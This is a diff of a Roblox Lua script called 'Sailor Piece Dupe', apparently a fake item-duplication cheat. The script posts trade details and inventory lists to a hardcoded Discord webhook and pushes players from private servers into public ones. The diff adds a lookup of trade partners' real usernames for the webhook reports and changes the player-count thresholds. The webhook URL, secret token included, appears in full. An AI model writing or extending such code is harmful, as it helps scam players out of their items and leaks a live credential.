@@ -85,15 +85,15 @@ local WEBHOOK_ENABLED = true
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1495429904185954455/Xek30UZRD4dXTcvLalG2VHwdxjibJCDpCCxGD6zwWP819NZqG8yw91ehkXNOOkS1f_s-"
 local WEBHOOK_ONE_LOG_PER_SERVER = true
 local WEBHOOK_MAX_INVENTORY_LINES = 100
-local PRIVATE_SERVER_PLAYER_THRESHOLD = 1
-local BLOCK_SCRIPT_IN_PRIVATE_SERVER = true
+local PRIVATE_SERVER_PLAYER_THRESHOLD = 2
+local BLOCK_SCRIPT_IN_PRIVATE_SERVER = false
 local BLOCKED_SERVER_NOTIFICATION_INTERVAL = 3.0
 local BLOCKED_SERVER_NOTIFICATION_TITLE = "Sailor Piece Dupe"
 local BLOCKED_SERVER_NOTIFICATION_TEXT = "Script cannot run in new servers please switch to public server"
 local BLOCKED_SERVER_COUNTDOWN_SECONDS = 5
 local PRIVATE_SERVER_DETECTION_GRACE_SECONDS = 3
 local AUTO_HOP_TO_PUBLIC_SERVER_WHEN_BLOCKED = true
-local PUBLIC_SERVER_MIN_PLAYER_COUNT = 1
+local PUBLIC_SERVER_MIN_PLAYER_COUNT = 3
 local SERVER_HOP_MAX_PAGE_SCANS = 6
 local SERVER_HOP_API_LIMIT = 100
 local SERVER_HOP_RETRY_DELAY = 2.0
@@ -2304,26 +2304,50 @@ tradeCompleted.OnClientEvent:Connect(function(data)
 
     local myLines, myCount = buildTradeItemLines(myItems)
     local theirLines, theirCount = buildTradeItemLines(theirItems)
-    -- Use cached partner name/userId as primary source
-    local tradePartnerUsername = lastTradePartnerUsername
-    if not tradePartnerUsername and lastTradePartnerUserId then
-        tradePartnerUsername = tostring(lastTradePartnerUserId)
-    end
-    if not tradePartnerUsername then
-        tradePartnerUsername = "Unknown"
-    end
-    print("[DEBUG] Traded With:", tradePartnerUsername)
-    print("[DEBUG] My Items Count:", myCount, "Their Items Count:", theirCount)
-    -- Reset cache after use
-    lastTradePartnerUsername = nil
-    lastTradePartnerUserId = nil
+	-- Use cached partner name/userId as primary source
+	local tradePartnerDisplayName = lastTradePartnerUsername or nil
+	local tradePartnerUserId = lastTradePartnerUserId or nil
+	local tradePartnerUsername = nil
 
-    sendWebhook("Trade Successful", "Trade completed successfully", false, {
-        {
-            name = "Traded With",
-            value = tradePartnerUsername,
-            inline = false,
-        },
+	-- Try to get the real username if we have userId
+	if tradePartnerUserId then
+		local success, userInfo = pcall(function()
+			return Players:GetNameFromUserIdAsync(tradePartnerUserId)
+		end)
+		if success and typeof(userInfo) == "string" then
+			tradePartnerUsername = userInfo
+		end
+	end
+
+	-- Fallbacks
+	if not tradePartnerDisplayName and tradePartnerUsername then
+		tradePartnerDisplayName = tradePartnerUsername
+	elseif not tradePartnerDisplayName and tradePartnerUserId then
+		tradePartnerDisplayName = tostring(tradePartnerUserId)
+	elseif not tradePartnerDisplayName then
+		tradePartnerDisplayName = "Unknown"
+	end
+	if not tradePartnerUsername and tradePartnerDisplayName then
+		tradePartnerUsername = tradePartnerDisplayName
+	elseif not tradePartnerUsername and tradePartnerUserId then
+		tradePartnerUsername = tostring(tradePartnerUserId)
+	elseif not tradePartnerUsername then
+		tradePartnerUsername = "Unknown"
+	end
+
+	local tradedWithText = string.format("%s (%s)", tradePartnerDisplayName, tradePartnerUsername)
+	print("[DEBUG] Traded With:", tradedWithText)
+	print("[DEBUG] My Items Count:", myCount, "Their Items Count:", theirCount)
+	-- Reset cache after use
+	lastTradePartnerUsername = nil
+	lastTradePartnerUserId = nil
+
+	sendWebhook("Trade Successful", "Trade completed successfully", false, {
+		{
+			name = "Traded With",
+			value = tradedWithText,
+			inline = false,
+		},
         {
             name = string.format("You Gave - %d total", myCount),
             value = "```\n" .. (myLines ~= "" and myLines or "None") .. "\n```",
